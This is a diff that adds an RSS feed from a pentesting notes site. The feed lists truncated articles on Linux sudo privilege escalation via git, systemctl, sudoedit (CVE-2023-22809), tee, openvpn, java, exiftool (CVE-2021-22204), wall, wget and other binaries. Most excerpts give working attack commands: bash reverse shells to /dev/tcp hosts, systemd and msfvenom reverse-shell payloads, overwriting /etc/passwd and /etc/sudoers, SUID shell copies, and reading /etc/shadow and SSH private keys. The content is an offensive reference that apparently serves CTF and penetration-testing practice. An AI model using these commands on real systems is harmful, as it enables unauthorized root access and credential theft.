@@ -1,0 +1,152 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Sudo on D0CUM3NTN4T10N</title>
+    <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/</link>
+    <description>Recent content in Sudo on D0CUM3NTN4T10N</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en</language>
+    <lastBuildDate>Wed, 17 Jan 2024 16:14:24 +0530</lastBuildDate>
+    <atom:link href="https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Sudo Privilege Escalation by Overriding Shared Library</title>
+      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-privilege-escalation-by-overriding-shared-library/</link>
+      <pubDate>Thu, 26 Oct 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-privilege-escalation-by-overriding-shared-library/</guid>
+      <description>LD_PRELOAD, LD_LIBRARY_PATH Overwriting linkInvestigation linkCheck sudo commands.&#xA;sudo -l The below is the output example.&#xA;env_keep&amp;#43;=LD_PRELOAD (ALL : ALL) NOPASSWD: somecmd If we find the sudo command keeps LD_PRELOAD environment, we can overwrite this variable to load our custome shared object and escalate the privileges.&#xA;Also, we can replace the LD_PRELOAD with LD_LIBRARY_PATH.&#xA;By the way, to list shared libraries required by the executable, use ldd command.&#xA;ldd somecmd Exploitation linkFirst off, create exploit.</description>
+    </item>
+    <item>
+      <title>Sudo Git Privilege Escalation</title>
+      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-git-privilege-escalation/</link>
+      <pubDate>Sun, 23 Jul 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-git-privilege-escalation/</guid>
+      <description>Git Add/Commit link sudo /usr/bin/git --git-dir=/opt/example/.git --work-tree=/opt/example add -A sudo /usr/bin/git --git-dir=/opt/example/.git --work-tree=/opt/example commit -m &amp;#34;commit&amp;#34; If we can commit the git repository as root, we may be able to escalate privileges.&#xA;Exploitation link Create a Payload echo &amp;#39;bash -c &amp;#34;bash -i &amp;gt;&amp;amp; /dev/tcp/10.0.0.1/4444 0&amp;gt;&amp;amp;1&amp;#34;&amp;#39; &amp;gt; /tmp/revshell chmod &amp;#43;x /tmp/revshell Set Git Config # Go to the git repository cd /opt/example git init echo &amp;#39;*.php filter=indent&amp;#39; &amp;gt; .git/info/attributes git config filter.</description>
+    </item>
+    <item>
+      <title>Sudo Systemctl Privilege Escalation</title>
+      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-systemctl-privilege-escalation/</link>
+      <pubDate>Wed, 12 Jul 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-systemctl-privilege-escalation/</guid>
+      <description>Modify Configurations link sudo -l (ALL) NOPASSWD: systemctl If we can run &amp;ldquo;systemctl&amp;rdquo; command as root, and we can edit the config file, then we might be a root user.&#xA;1. Update the Config File linkWe need to insert the payload for reverse shell to get a root shell into the /etc/systemd/system/example.service.&#xA;[Unit] This is an example service. [Service] Type=simple User=root ExecStart=/bin/bash -c &amp;#39;bash -i &amp;gt;&amp;amp; /dev/tcp/&amp;lt;local-ip&amp;gt;/4444 0&amp;gt;&amp;amp;1&amp;#39; [Install] WantedBy=multi-user.target Replace “&amp;lt;local-ip&amp;gt;” with your local ip address.</description>
+    </item>
+    <item>
+      <title>Sudoedit Privilege Escalation</title>
+      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudoedit-privilege-escalation/</link>
+      <pubDate>Wed, 29 Mar 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudoedit-privilege-escalation/</guid>
+      <description>Investigation link sudo -l (root) sudoedit /opt/example.txt If we can execute sudoedit command as root, we might be able to escalate the privileges with some version.&#xA;Exploitation (CVE-2023-22809) link export EDITOR=&amp;#34;vim -- /etc/sudoers&amp;#34; sudoedit /opt/example.txt In vim editor, add the following line in /etc/sudoers.&#xA;Assume the current username is “john”&#xA;john ALL=(ALL:ALL) ALL After that, we can escalate to root privilege.&#xA;sudo su root </description>
+    </item>
+    <item>
+      <title>Sudo Tee Privilege Escalation</title>
+      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-tee-privilege-escalation/</link>
+      <pubDate>Sun, 26 Feb 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-tee-privilege-escalation/</guid>
+      <description>Investigation link (root) NOPASSWD: /usr/bin/tee If we can execute tee command as root, we can escalate to privilege.&#xA;Exploitation link1. Create a New Password for New User linkAssume the new username is &amp;ldquo;tester&amp;rdquo;.&#xA;# -1: MD5 algorithm # -salt: Use privided salt -&amp;gt; The new username here openssl passwd -1 -salt &amp;#34;tester&amp;#34; &amp;#34;password123&amp;#34; # Output: $1$tester$LvsygQ2GEt7VUJQEqhMLf/ Copy the output password.&#xA;2. Write New Line with Tee linkPaste the password in printf and overwrite /etc/passwd using tee command.</description>
+    </item>
+    <item>
+      <title>Sudo OpenVPN Privilege Escalation</title>
+      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-openvpn-privilege-escalation/</link>
+      <pubDate>Fri, 17 Feb 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-openvpn-privilege-escalation/</guid>
+      <description>Investigation link (root) /usr/sbin/openvpn /opt/example.ovpn If we can execute openvpn command as root and we have a permission of editing the .ovpn file, we can escalate to privilege.&#xA;Exploitation link1. Create a Payload linkFirst create a shell script to reverse shell. For example, create /tmp/shell.sh.&#xA;Replace &amp;lt;local-ip&amp;gt; with your local ip address.&#xA;#!/bin/bash bash -i &amp;gt;&amp;amp; /dev/tcp/&amp;lt;local-ip&amp;gt;/4444 0&amp;gt;&amp;amp;1 Then change the file permission so that root can execute this script.</description>
+    </item>
+    <item>
+      <title>Sudo Umount Privilege Escalation</title>
+      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-umount-privilege-escalation/</link>
+      <pubDate>Wed, 15 Feb 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-umount-privilege-escalation/</guid>
+      <description>Investigation link sudo -l (root) NOPASSWD: /bin/umount If we can execute umount command as root, we can escalate to privilege.&#xA;Exploitation linkIn target machine, check what directory is mounted.&#xA;cat /etc/fstab showmount -e localhost Assume the /opt/example folder is mounted.&#xA;If we unmount this folder, original files, that existed before the directory is mounted, may appear.&#xA;sudo /bin/umount /opt/example ls -al /opt/example </description>
+    </item>
+    <item>
+      <title>Sudo Java Privilege Escalation</title>
+      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-java-privilege-escalation/</link>
+      <pubDate>Tue, 14 Feb 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-java-privilege-escalation/</guid>
+      <description>Investigation link sudo -l (root) /usr/bin/java -jar *.jar If we can execute java command with arbitrary .jar file as root, we can escalate to privileges.&#xA;Exploitation link1. Create a JAR File linkFirst, create a custom jar file in local machine.&#xA;Replace &amp;lt;local-ip&amp;gt; with your local ip address.&#xA;msfvenom -p java/shell_reverse_tcp LHOST=&amp;lt;local-ip&amp;gt; LPORT=4444 -f jar -o shell.jar Then transfer the file to remote machine.&#xA;2. Reverse Shell linkIn local machine, start a listener.</description>
+    </item>
+    <item>
+      <title>Sudo Service Privilege Escalation</title>
+      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-service-privilege-escalation/</link>
+      <pubDate>Sat, 11 Feb 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-service-privilege-escalation/</guid>
+      <description>Investigation link sudo -l (ALL : ALL) /usr/sbin/service vsftpd restart If we can execute service command as root, we may be able to escalate to root privilege.&#xA;Exploitation link1. Find the Location of the Config File linkAssume we can operate the vsftpd service as root. Firse off, find the service config file for vsftpd.&#xA;find / -name &amp;#34;*vsftpd*&amp;#34; For instance, we&amp;rsquo;ll find the location as below.&#xA;/lib/systemd/system/vsftpd.service /etc/systemd/system/multi-user.target.wants/vsftpd.service When getting the locations, the next thing to do is to check the permission.</description>
+    </item>
+    <item>
+      <title>Sudo ClamAV Privilege Escalation</title>
+      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-clamav-privilege-escalation/</link>
+      <pubDate>Sun, 05 Feb 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-clamav-privilege-escalation/</guid>
+      <description>Investigation linkIf we can execute “clamscan” command as root as below,&#xA;sudo /usr/bin/clamscan /etc/shadow --copy=/tmp/results we can read sensitive files by applying the custom yara rule.&#xA;Exploitation link1. Create a Yara Rule linkFirst off, check the location in which the yara file can be created.&#xA;find / -name &amp;#34;clam*&amp;#34; 2&amp;gt;/dev/null For instance, assume we can create the yara file under /var/lib/clamav/.&#xA;Create the yara rule in there.&#xA;Assume we want to read /etc/shadow, so specify the string “root” because the /etc/shadow contains “root” user name.</description>
+    </item>
+    <item>
+      <title>Sudo Dstat Privilege Escalation</title>
+      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-dstat-privilege-escalation/</link>
+      <pubDate>Sun, 05 Feb 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-dstat-privilege-escalation/</guid>
+      <description>dstat is a versatile tool for generating system resource statistics.&#xA;It allows users to create a custom plugin and execute by adding option e.g. dstat --myplugin.&#xA;Investigation link sudo -l (ALL) NOPASSWD: /usr/bin/dstat If we can execute &amp;ldquo;dstat&amp;rdquo; command as root, we can gain access to privileges by using our malicious plugin.&#xA;Exploitation link1. Create a New Dstat Plugin linkFirst off, find locate the &amp;ldquo;dstat&amp;rdquo; directory.&#xA;find / -type d -name dstat 2&amp;gt;/dev/null Assume the location of dstat is “/usr/local/share/dstat”.</description>
+    </item>
+    <item>
+      <title>Sudo Exiftool Privilege Escalation</title>
+      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-exiftool-privilege-escalation/</link>
+      <pubDate>Sun, 05 Feb 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-exiftool-privilege-escalation/</guid>
+      <description>Investigation link (root) NOPASSWD: /usr/local/bin/exiftool If we can execute &amp;ldquo;exiftool&amp;rdquo; command as root, we can gain access to privileges.&#xA;Arbitrary Code Execution (CVE-2021-22204) version 7.44+ linkReference: https://vk9-sec.com/exiftool-12-23-arbitrary-code-execution-privilege-escalation-cve-2021-22204/&#xA;Check the exiftool version.&#xA;If the exiftool version is later than 7.44, we can execute arbitrary code.&#xA;exiftool -ver Exploitation linkIn local machine, create the payload in a file named “exploit”.&#xA;(metadata &amp;#34;\c${system(&amp;#39;/bin/sh&amp;#39;)};&amp;#34;) Next, compress the file.&#xA;bzz exploit exploit.bzz Then create the DjVu file using the compressed file.</description>
+    </item>
+    <item>
+      <title>Sudo Fail2ban Privilege Escalation</title>
+      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-fail2ban-privilege-escalation/</link>
+      <pubDate>Sun, 05 Feb 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-fail2ban-privilege-escalation/</guid>
+      <description>Fail2ban is an intrusion prevention software framework.&#xA;It prevents against brute force attacks.&#xA;Investigation link sudo -l (root) NOPASSWD: /etc/init.d/fail2ban restart If we can execute &amp;ldquo;fail2ban&amp;rdquo; as root, we can gain access to privileges by modifying the configuration file.&#xA;We need to check if the config file is writable.&#xA;find /etc -writable -ls 2&amp;gt;/dev/null 4 drwxrwx--- 2 root security 4096 Oct 16 08:57 /etc/fail2ban/action.d Look inside of &amp;quot;/etc/fail2ban/jail.conf&amp;quot; to know more about how fail2ban is configured.</description>
+    </item>
+    <item>
+      <title>Sudo Path Traversal Privilege Escalation</title>
+      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-path-traversal-privilege-escalation/</link>
+      <pubDate>Sun, 05 Feb 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-path-traversal-privilege-escalation/</guid>
+      <description>Investigation link sudo -l (ALL) /usr/bin/node /usr/local/scripts/*.js If the file path uses wildcards, we may execute arbitrary files.&#xA;In short, we can refer to files in different directories which the system owner unintended.&#xA;Exploitation linkAssume we can execute ‘node’ command as root and js file.&#xA;Create the “test.js” under /tmp, which spawns a root shell after executing ‘node’ command.&#xA;// /tmp/test.js require(&amp;#34;child_process&amp;#34;).spawn(&amp;#34;/bin/sh&amp;#34;, {stdio: [0, 1, 2]}) Now run ‘node’ command as root.</description>
+    </item>
+    <item>
+      <title>Sudo Reboot Privilege Escalation</title>
+      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-reboot-privilege-escalation/</link>
+      <pubDate>Sun, 05 Feb 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-reboot-privilege-escalation/</guid>
+      <description>Investigation link sudo -l (ALL) NOPASSWD: /usr/sbin/reboot If we can execute &amp;ldquo;reboot&amp;rdquo; command as root, we can escalate to privileges.&#xA;Exploitation link1. Find Service Config Files Which Are Writable linkWe need to look for the system service config file which are writable.&#xA;find / -writable -name &amp;#34;*.service&amp;#34; 2&amp;gt;/dev/null /etc/systemd/system/example.service 2. Insert a Payload linkIf we find a writable file, we can inject a payload into Service.ExecStart.&#xA;# /etc/systemd/systm/example.service [Unit] Description=Zeno monitoring [Service] Type=simple User=root ExecStart=/bin/bash -c &amp;#39;cp /bin/bash /home/&amp;lt;username&amp;gt;/bash; chmod &amp;#43;xs /home/&amp;lt;username&amp;gt;/bash&amp;#39; [Install] WantedBy=multi-user.</description>
+    </item>
+    <item>
+      <title>Sudo Screen Privilege Escalation</title>
+      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-screen-privilege-escalation/</link>
+      <pubDate>Sun, 05 Feb 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-screen-privilege-escalation/</guid>
+      <description>Investigation link sudo -l (root) /usr/bin/screen -r testsession If we can execute &amp;ldquo;screen&amp;rdquo; command as root, we can spawn a root shell from the screen session.&#xA;Exploitation linkFirst execute &amp;ldquo;screen&amp;rdquo; command as root, then a screen session will be start.&#xA;Now we can spawn a root shell by pressing “Ctrl+a+c” in the screen session.</description>
+    </item>
+    <item>
+      <title>Sudo Shutdown, Poweroff Privilege Escalation</title>
+      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-shutdown-poweroff-privilege-escalation/</link>
+      <pubDate>Sun, 05 Feb 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-shutdown-poweroff-privilege-escalation/</guid>
+      <description>Investigation link sudo -l (ALL) NOPASS: /usr/sbin/shutdown If we can execute &amp;ldquo;shutdown&amp;rdquo; command as root, we can gain access to privileges by overwriting the path of &amp;ldquo;poweroff&amp;rdquo;.&#xA;Exploitation linkFirst create /tmp/poweroff binary which invoke a shell.&#xA;echo /bin/sh &amp;gt; /tmp/poweroff # or echo /bin/bash &amp;gt; /tmp/poweroff Then change permissions of the file and add &amp;quot;/tmp&amp;quot; folder to PATH.&#xA;chmod &amp;#43;x /tmp/poweroff export PATH=/tmp:$PATH Now execute &amp;ldquo;shutdown&amp;rdquo; as root.&#xA;# Some SUID command sudo /usr/sbin/shutdown # Then you are root user root&amp;gt; /tmp/poweroff is executed and spawn a root shell.</description>
+    </item>
+    <item>
+      <title>Sudo Vim Privilege Escalation</title>
+      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-vim-privilege-escalation/</link>
+      <pubDate>Sun, 05 Feb 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-vim-privilege-escalation/</guid>
+      <description>Investigation link sudo -l (ALL) NOPASSWD: vim example.txt If we can execute &amp;ldquo;vim&amp;rdquo; command as root, we can execute the shell command in the vim editor.&#xA;Exploitation linkSimply run &amp;ldquo;vim&amp;rdquo; command as root.&#xA;sudo vim example.txt In Vim editor, we can run shell commands as root.&#xA;:r!whoami </description>
+    </item>
+    <item>
+      <title>Sudo Wall Privilege Escalation</title>
+      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-wall-privilege-escalation/</link>
+      <pubDate>Sun, 05 Feb 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-wall-privilege-escalation/</guid>
+      <description>Investigation link sudo -l (ALL) NOPASSWD: wall Exploitation link # Reverse shell sudo wall &amp;#34;$(bash -c &amp;#39;bash -i &amp;gt;&amp;amp; /dev/tcp/&amp;lt;local-ip&amp;gt;/&amp;lt;local-port&amp;gt; 0&amp;gt;&amp;amp;1&amp;#39;)&amp;#34; # Gets a SSH private key of another user sudo wall &amp;#34;$(cat /home/user/.ssh/id_rsa)&amp;#34; </description>
+    </item>
+    <item>
+      <title>Sudo Wget Privilege Escalation</title>
+      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-wget-privilege-escalation/</link>
+      <pubDate>Sun, 05 Feb 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-wget-privilege-escalation/</guid>
+      <description>Investigation link sudo -l (root) NOPASSWD: /usr/bin/wget If we can execute &amp;ldquo;wget&amp;rdquo; as root, we may be able to escalate privileges.&#xA;Modify /etc/shadow linkGet &amp;quot;/etc/shadow&amp;quot; and generate a new hash passwd, then set it to the shadow file, next upload it.&#xA;That changes the root password.&#xA;1. Get the Content of /etc/shadow linkTo see the content of /etc/shadow, we can use netcat listener.&#xA;So First, start a listener in local machine.</description>
+    </item>
+  </channel>
+</rss>
